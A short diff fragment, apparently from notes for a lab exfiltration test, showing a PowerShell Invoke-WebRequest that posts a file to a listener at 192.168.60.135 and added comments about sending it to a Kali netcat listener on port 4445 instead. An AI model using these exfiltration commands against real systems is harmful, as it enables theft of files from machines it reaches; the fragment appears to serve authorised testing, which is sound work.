@@ -22,3 +22,6 @@ Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile 
 
 # Cleanup after the test:
 # Remove-Item C:\Windows\Temp\exfil_test.zip -Force
+
+# NOTICE THAT: Point the Windows Invoke-WebRequest to port 4445, where the Kali script has a netcat listener waiting instead of using port 8000 with http.server
+# IF you want to use the http.server , you can use the `curl` or `wget` command for downloading file from window
